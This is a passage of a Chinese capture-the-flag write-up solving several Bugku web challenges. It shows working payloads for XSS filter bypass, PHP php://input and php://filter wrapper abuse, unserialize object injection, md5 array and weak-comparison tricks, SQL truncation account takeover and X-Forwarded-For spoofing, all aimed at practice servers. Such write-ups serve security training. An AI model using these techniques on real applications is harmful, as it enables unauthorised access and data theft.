<p>当<code>line</code>=0，1，2等数的时候，对应着文件的0，1，2行<br>所以这个时候我们要做的是就是把<code>index.php</code>这个文件读到，<br>首先将<code>index.php</code>base64转码：<code>aW5kZXgucGhw</code><br>然后写个脚本将<code>line</code>从0~40遍历一次，<br>附上php脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	$url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;;</span><br><span class="line">	$url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line">	</span><br><span class="line">	for ($i=0; $i &lt; 40; $i++) &#123; </span><br><span class="line"></span><br><span class="line">		$url = $url1.$i.$url2;</span><br><span class="line"></span><br><span class="line">		$contents = file_get_contents($url);</span><br><span class="line">		echo $contents;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;</span><br><span class="line">url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line">for i in range(40):</span><br><span class="line">   url=url1+str(i)+url2</span><br><span class="line">   ans = requests.get(url)</span><br><span class="line">   print(ans.text)</span><br></pre></td></tr></table></figure></p>
<p>脚本运行之后得到的源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0); </span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); </span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; </span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); </span><br><span class="line">$file_list = array( </span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;, </span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;, </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; </span><br><span class="line">$file_list[2]=&apos;keys.php&apos;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123; </span><br><span class="line">$fa = file($file); </span><br><span class="line">echo $fa[$line]; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>看到源码之后，当存在<code>cookie:margin</code>且等于<code>margin</code>的时候，<br>才能读keys.php的源码,<br>拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/61360232.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h2><p>题目提示必须包含<code>alert(_key_)</code>，所以先提交:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是没有给出flag，查看源代码：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/71611277.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>可以看到此时s里的内容<code>&lt;</code> <code>&gt;</code>已经被转义成了<code>&amp;lt</code> <code>&amp;gt</code>,<br>所以如果要得到flag，必须先绕过过滤：<br>Unicode编码绕过,<a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml" target="_blank" rel="noopener">查看原理</a></p>
<p>用<code>\u003c</code>和<code>\u003e</code>来代替<code>&lt;</code> <code>&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure>
<p>替换之后没有弹窗，但是在源代码里可以看到flag:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/83372728.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>这题做了处理，不能用简单的<code>alert</code>来弹窗，但是也有其他方法，<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e;</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>上来发现没什么提示，看了看源代码，<br>提示了<code>1p.html</code>，访问之后。。。到了bugku的论坛，<br>估计是有个跳转，<br>直接拿bp抓包访问即可：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/8227629.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>做到这就有种感觉了，这题纯粹是来坑人的,<br>将中间那段代码先复制到记事本(待会方便改)，<br>对编码熟悉一点的人应该都知道该怎么做了，<code>base64</code>转码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ</span><br></pre></td></tr></table></figure></p>
<p>为什么是这一段，因为base64里是不会出现百分号的，<br>base64解码：<a href="http://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">附上链接</a><br>解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure></p>
<p>ctf做多了就知道，这又是一段URL编码，<br>这个时候比较坑的一点是，<br>你得把这段url编码放到之前的编码里再URL解码<br>URL编码：<a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">附上链接</a><br>解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var Words = &quot;&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--&quot;;if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;==--&gt;&quot;</span><br></pre></td></tr></table></figure></p>
<p>直接看代码，访问<code>f4l2a3g.txt</code><br>得到flag:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/92842859.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>一开始题目没给什么提示，看了看源代码：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/54563244.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>一道代码审计题，首先是需要存在<code>user</code>变量，并且<code>user</code>变量的值需要等于<code>welcome to the bugkuctf</code>，<br>但是又不能直接提交<code>txt</code>等于<code>welcome to the bugkuctf</code>，因为用了<code>file_get_contents</code>，<br>所以只能用<a href="https://cherrygk.github.io/2018/07/12/phpagree/" target="_blank" rel="noopener">php伪协议</a>了,<br>这里用到的是<code>php://input</code>：</p>
<ul>
<li>访问请求的原始数据的只读流，可以接收到post的数据</li>
</ul>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/89781081.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>可以看到已经绕过了<code>file_get_contents</code>，所以现在需要读到<code>hint.php</code>的源码，<br>但是可以看到被包含了，但是被服务器解析了，所以现在需要<code>php://filter</code>：</p>
<ul>
<li>将代码过滤成<code>base64</code>展现出来</li>
</ul>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/62718348.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>解码出来之后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>是一个<code>Flag类</code>，里面是一个<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a><code>tostring</code>，官方文档:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br></pre></td></tr></table></figure>
<p>大概意思就是当对象被当成了字符串时echo时，执行这个方法</p>
<p>再用同样的方法获取到index.php的源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">		echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到已经通过了第一个判断，接下来是需要绕过第二个判断，<br>而且按照题目的解释，可以知道flag就在<code>flag.php</code>里，但是代码里匹配了<code>flag</code>，<br>所以直接用伪协议读取<code>flag.php</code>是行不通的了，<br>所以现在看到第三个参数，<code>password</code>,代码里有一个函<a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a>,对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>现在需要做的是将<code>Flag类</code>实例化，使<code>flag.php</code>文件能够成功包含<br>本地代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ff = new Flag;</span><br><span class="line">$ff-&gt;file = &apos;flag.php&apos;;</span><br><span class="line">echo serialize($ff);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码就是实例化了Flag类并且将其中的<code>flie</code>等于<code>flag.php</code>，并且序列化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到一个这样的序列串，将<code>password</code>等于这个串即可</p>
<p>最终的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">welcome to the bugkuctf</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/68106823.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>这题把伪协议这块锻炼了一遍，是个很好的练习题</p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>这题直接就扫到了<code>flag.txt,</code>应该是题目坏了</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/89087165.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>这题无非就是匹配一个正则，代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>照着其中的表达式一步一步写就行了,不会正则的可以参考<a href="http://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">正则表达式</a>,<br>引用网上一位大佬写的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表达式直接写出来的字符串直接利用，如key</span><br><span class="line">“.”代表任意字符</span><br><span class="line">“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束</span><br><span class="line">“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束</span><br><span class="line">[a-z]代表a-z中的任意一个字符</span><br><span class="line">[[:punct:]]代表任意一个字符，包括各种符号，记得是符号</span><br><span class="line">/i代表大小写不敏感</span><br><span class="line">&#123;4-7&#125;代表[0-9]中数字连续出现的次数是4-7次</span><br><span class="line">\s匹配任意的空白符</span><br><span class="line">\d 匹配数字</span><br><span class="line">\b 匹配单词的开始或结束</span><br></pre></td></tr></table></figure>
<p>我的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web10/?id=keykkeykkkkkkey:/k/kkeyk,</span><br></pre></td></tr></table></figure></p>
<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>一进题目就是<code>PHP是世界上最好的语言</code>,代码审计无误了<br>看一下源代码，有一个跳转，得到了一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目首先给了提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:SQL约束攻击</span><br></pre></td></tr></table></figure></p>
<p>CSDN上一篇文章讲的很好，<a href="https://blog.csdn.net/qq_32400847/article/details/54137747" target="_blank" rel="noopener">参考链接</a>,<br>简单来说，这题就是先注册一个admin加很多空格如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin+++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure></p>
<p>此时数据库里插入的数据也是这个，但是在查询语句，也就是<code>select</code>语句中，字符串末尾的空格符将会被删除,<br>就是刚刚注册的<code>&#39;admin                                                &#39;</code>与<code>&#39;admin&#39;</code>一样，<br>所以这题思路就出来了，注册一个<code>admin</code>后面跟上很多空格的用户，然后用正常使用admin登陆，密码填写刚刚注册使用的密码，直接登陆进管理员，得到flag</p>
<p>附上查询语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT username FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;</span><br><span class="line">              AND password=&apos;$password&apos; &quot;</span><br></pre></td></tr></table></figure>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>这题很简单，将消息头改一下就行了：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/62885294.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>题目提示md5，先试试弱类型比较的漏洞<code>240610708</code></p>
<p>直接拿到flag,payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/md5.php?a=240610708</span><br></pre></td></tr></table></figure></p>
<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从本地访问!</span><br></pre></td></tr></table></figure></p>
<p>直接构造<code>XFF</code>,在消息头里加上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p>直接拿到flag</p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目直接给了源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;flag.php&apos;); </span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); </span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; </span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) </span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) </span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>先解释一下代码，当<code>uname`</code>passwd<code>存在，并且两个值不能相等，但是他们俩的</code>sha1<code>值必须相等，原则上是不可能实现的，所以漏洞就在这产生了，
这题看到了</code>sha1()<code>，跟</code>md5()`不一样，所以需要<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">SHA1碰撞</a>，我引用了这篇文章的两个hax</p>
